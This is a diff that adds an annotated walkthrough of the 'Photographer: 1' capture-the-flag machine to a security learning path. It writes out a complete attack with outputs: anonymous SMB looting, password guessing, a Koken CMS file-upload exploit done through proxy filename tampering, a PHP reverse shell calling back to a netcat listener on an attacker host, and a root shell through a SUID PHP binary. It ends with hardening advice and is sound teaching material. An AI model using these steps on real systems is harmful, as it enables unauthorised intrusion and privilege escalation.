@@ -249,4 +249,378 @@ weaker.
 
 ---
 
+## The commands, annotated — every input and every output
+
+Published walkthroughs use `192.168.56.122` for the target and `192.168.56.10` for Kali.
+
+### 1. Scan
+
+```bash
+sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
+```
+
+```text
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Photographer by v1n1v131r4
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: daisa ahomi
+| http-robots.txt: 1 disallowed entry
+|_/admin/
+Service Info: Host: PHOTOGRAPHER
+```
+
+Two web servers, **two different sites**. Port 80 is a static portfolio; port 8000 is an
+application — and the NSE `http-robots.txt` script has already read its `robots.txt` for you and
+printed the single disallowed entry: **`/admin/`**. `-p-` mattered: an application on 8000 with
+nothing interesting on 80 is a very common CTF shape, and a default scan invites you to give up.
+
+### 2. SMB: anonymous share first
+
+```bash
+smbmap -u guest -H TARGET
+smbclient -L //TARGET -N
+```
+
+```text
+[+] Guest session       IP: 192.168.56.122:445    Name: 192.168.56.122
+        Disk                                    Permissions     Comment
+        ----                                    -----------     -------
+        print$                                  NO ACCESS       Printer Drivers
+        sambashare                              READ ONLY       Samba on Ubuntu
+        IPC$                                    NO ACCESS       IPC Service
+```
+
+`smbmap` is the fastest first look because its **`Permissions`** column answers the only
+question that matters — can you read it, and can you write to it? `-u guest -H` means "a guest
+session, no password". `smbclient -L … -N` lists shares with a NULL session (`-N` = no
+credentials).
+
+```bash
+smbclient //TARGET/sambashare -N
+smb: \> dir
+smb: \> get mailsent.txt
+smb: \> get wordpress.bkp.zip
+smb: \> exit
+cat mailsent.txt
+```
+
+```text
+  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
+  wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020
+```
+```text
+Message-ID: <4129F3CA.2020509@dc.edu>
+From: Agi Clarence <agi@photographer.com>
+To: Daisa Ahomi <daisa@photographer.com>
+Subject: To Do - Daisa Website's
+Content-Type: text/plain; charset=us-ascii;
+
+Hi Daisa!
+Your website is ready. Login with your email and your password.
+Don't forget your password is your babygirl's name :)
+-- Agi
+```
+
+`get FILE` downloads into your current directory; `prompt` toggles the per-file confirmation;
+`recurse` plus `mget *` would fetch a whole tree.
+
+Read that email as the entire foothold. It hands you **two email addresses**, tells you the
+admin **logs in with an email address rather than a username**, and states the password is
+*"your babygirl's name"*. That is a **password hint**, and it is why the guess list is short and
+thematic rather than a 14-million-line dictionary. **Never put company correspondence on a
+share reachable by guests** — data classification matters more than any single technical
+control.
+
+### 3. The decoy backup
+
+```bash
+unzip -l wordpress.bkp.zip | head -20
+unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i 'define\|password'
+```
+
+```text
+Archive:  wordpress.bkp.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     5434  2020-07-20 12:11   wordpress/wp-config-sample.php
+   405431  2020-07-20 12:11   wordpress/wp-admin/edit.php
+```
+```text
+(no wp-config.php in the archive — only the stock sample)
+```
+
+A 12 MB WordPress backup on an anonymous share *looks* like a jackpot. `-l` lists contents
+without extracting (fast, and avoids writing 12 MB of files you do not need); `-p FILE` prints
+one member to stdout so you can grep it directly. **There is no `wp-config.php` — only the stock
+sample.** Two lessons: always inspect a backup's *contents* before assuming it leaks
+credentials, and note that real backups routinely do contain `wp-config.php`, `.env`, `id_rsa`
+and `*.sql`, so this is still a finding-grade exposure.
+
+### 4. Fingerprint the application
+
+```bash
+curl -s http://TARGET:8000/ | grep -io 'koken[^"]*\|<title>[^<]*</title>\|href="[^"]*"' | head -20
+curl -sI http://TARGET:8000/admin/
+```
+
+```text
+<title>daisa ahomi</title>
+href="/admin/"
+href="storage/originals/"
+Koken 0.22.24
+```
+```text
+HTTP/1.1 200 OK
+Server: Apache/2.4.18 (Ubuntu)
+X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
+Set-Cookie: koken_session_ci=...; path=/; HttpOnly
+```
+
+**Version first, research second.** `Koken 0.22.24` plus PHP `7.2.24` on Ubuntu 16.04. The
+`koken_session_ci` cookie confirms the framework, and `storage/originals/` is where uploads land
+— remember that path.
+
+```bash
+searchsploit koken
+searchsploit -m php/webapps/48706.txt && cat 48706.txt
+```
+
+```text
+# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload
+# Version: 0.22.24
+# Tested on: Ubuntu 16.04
+
+Description:
+Koken CMS allows authenticated administrators to import content. The import
+function checks the file extension on the CLIENT side ...
+```
+
+**The version matches exactly**, which is what makes EDB-48706 applicable rather than merely
+similar. `-m` mirrors the entry into your working directory; read it before acting. The key
+sentence is *"checks the file extension on the **CLIENT** side"* — meaning the browser's
+JavaScript rejects `.php`, but **the server does not**. That tells you the fix is not a clever
+filename: it is to send what the browser refused to send, which means an intercepting proxy.
+
+### 5. Log in with the inferred credential
+
+`http://TARGET:8000/admin/` → email `daisa@photographer.com`, password `babygirl`.
+
+```text
+Welcome back, Daisa.
+```
+
+If `babygirl` had not worked, the correct escalation is a **thematic** list, not a bigger one:
+
+```bash
+cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
+printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa Daisa daisaahomi 'babygirl2020' secret 'mybabygirl' >> daisa_words.txt
+sort -u daisa_words.txt -o daisa_words.txt
+```
+
+`cewl -d 2 -m 3` harvests words of three or more characters from two hops of the site — exactly
+the vocabulary an author who themed a box around a family would use. The appended variants are
+the standard transformations (case, punctuation, year, compound). `sort -u … -o` de-duplicates
+in place safely.
+
+### 6. Upload, intercept, mutate
+
+Prepare the shell:
+
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+sed -i "s/127.0.0.1/ATTACKER/" shell.php
+sed -i "s/1234/4444/" shell.php
+grep -nE '^\$(ip|port)' shell.php
+cp shell.php shell.php.jpg
+ls -l shell.php*
+```
+
+```text
+52:$ip = '192.168.56.10';  // CHANGE THIS
+53:$port = 4444;           // CHANGE THIS
+```
+```text
+-rw-r--r-- 1 kali kali 5493 May  4 14:18 shell.php
+-rw-r--r-- 1 kali kali 5493 May  4 14:20 shell.php.jpg
+```
+
+Identical sizes confirm `shell.php.jpg` is a copy, not a truncated one. **The `grep` is the
+verification step** — uploading a shell with an unedited `$ip` fails silently and looks like a
+networking problem.
+
+In the Koken admin panel choose **Library → Import content**, start Burp's intercept, upload
+`shell.php.jpg`, then in the intercepted request change the filename:
+
+```http
+Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
+```
+→
+```http
+Content-Disposition: form-data; name="files[]"; filename="shell.php"
+```
+
+Forward it. The **client-side check has already run** (in the browser, before the request left
+your machine), so the server receives a `.php` filename it never validated.
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"id":17,"title":"shell","filename":"shell.php","storage":{...}}
+```
+
+```text
+http://TARGET:8000/storage/originals/3c/13/shell.php
+```
+
+Read the JSON response as your confirmation: `filename` is the server's own record of what it
+stored, and `storage` reveals the **two-level hashed directory** (`3c/13/`) Koken puts files in.
+If the response does not give you the path, find it:
+
+```bash
+gobuster dir -u http://TARGET:8000/storage/originals/ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -q 2>/dev/null | head
+```
+
+### 7. Trigger, and read the shell banner
+
+```bash
+nc -lvnp 4444                                  # Kali, first
+curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
+```
+
+```text
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.56.122.
+Linux photographer 4.4.0-178-generic #208-Ubuntu SMP ... x86_64 GNU/Linux
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Why merely visiting the URL executed PHP:** Apache's handler mapping says "run `*.php` through
+the PHP interpreter", and `storage/originals/` is inside the document root with no override
+disabling it. Upload plus execute-in-place is the two halves of every file-upload RCE.
+
+Read the banner line by line: `4.4.0-178-generic … x86_64` → Ubuntu 16.04, 64-bit, kernel from
+April 2020 — **reasonably patched**, so kernel exploits are unlikely and you should expect a
+*configuration* escalation. `sh: 0: can't access tty` is normal for a bare reverse shell.
+
+Upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo; fg`,
+`export TERM=xterm; stty rows 40 cols 160`.
+
+### 8. The user flag is a real boundary
+
+```bash
+ls -la /home/daisa/
+cat /home/daisa/user.txt
+```
+
+```text
+-rw------- 1 daisa daisa 38 Jul 21 03:44 user.txt
+cat: /home/daisa/user.txt: Permission denied
+```
+
+`-rw-------` owned by `daisa` — **`www-data` cannot read it.** That is not decoration; it is the
+box telling you to escalate. Two ways forward: reuse the Koken password (`su daisa` with
+`babygirl` — CMS-to-system credential reuse is the single most common lateral movement on real
+engagements), or skip straight to root and read it from there.
+
+### 9. The checklist, and why it points at SUID
+
+```bash
+sudo -l
+cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*
+uname -r
+```
+
+```text
+sudo: command not found
+no crontab for www-data
+4.4.0-178-generic
+```
+
+No sudo, all-default cron, kernel patched to April 2020 (Dirty COW and overlayfs both long
+fixed). So the remaining vector is **SUID**:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+ls -l /usr/bin/php7.2
+```
+
+```text
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/php7.2
+```
+```text
+-rwsr-xr-x 1 root root 4538528 Jan 14  2020 /usr/bin/php7.2
+```
+
+`-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset* match, so it
+also catches SGID); `-type f` restricts to regular files; `2>/dev/null` discards the thousands
+of `Permission denied` errors that would otherwise bury the answer. **Compare against the stock
+baseline** so the odd entry jumps out — everything above `php7.2` is default Ubuntu.
+
+`-rwsr-xr-x` with owner `root`: somebody ran `chmod u+s /usr/bin/php7.2`. That is not a package
+default.
+
+### 10. Escalate
+
+```bash
+/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+id
+cat /home/daisa/user.txt
+cat /root/proof.txt
+```
+
+```text
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
+```
+
+**Dissect the command — every part is load-bearing.**
+
+| Piece | Meaning |
+| --- | --- |
+| `/usr/bin/php7.2` | the **absolute path**. Bare `php -r …` may resolve to a different, non-SUID PHP |
+| `-r "code"` | run PHP code directly, no file needed |
+| `pcntl_exec('/bin/sh', …)` | PHP's **process-control** function: replaces the current process image with `/bin/sh`, so the new shell **inherits** the effective UID rather than being spawned as a child |
+| `['-p']` | privileged mode — **mandatory** |
+
+**Forgetting `-p` is the number-one mistake on this box.** Bash deliberately drops its effective
+UID at startup unless invoked with `-p`; without it you get a `$` prompt and conclude wrongly
+that the escalation failed.
+
+**Read `id` correctly:** `uid=33(www-data)` is your *real* UID, unchanged; **`euid=0(root)`** is
+your *effective* UID, and that is what the kernel consults for permission checks. This is a SUID
+elevation, not a login — which matters for auditing, because the original identity is still
+recorded.
+
+| Flag | Location | Value |
+| --- | --- | --- |
+| **User** | `/home/daisa/user.txt` | `{USER-FLAG: …}` |
+| **Root** | `/root/proof.txt` | `{ROOT-FLAG: …}` |
+
+> ### 📖 The rule to carry away
+>
+> **Remove SUID from interpreters — always.** `php`, `python`, `perl`, `ruby`, `node`, `bash`,
+> `vim`, `less`, `tar`, `find` and `awk` must never carry the setuid bit. An interpreter is a
+> full programming language: it can read and write any file, spawn processes and open sockets.
+> Handing any local user a SUID-root interpreter is handing them root. Detect drift against a
+> baseline — `find / -perm -4000 -type f` diffed weekly, or `aide`, `osquery`
+> (`SELECT * FROM suid_bin`) and Wazuh automatically. A new SUID file appearing should page
+> someone immediately.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · next: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)._
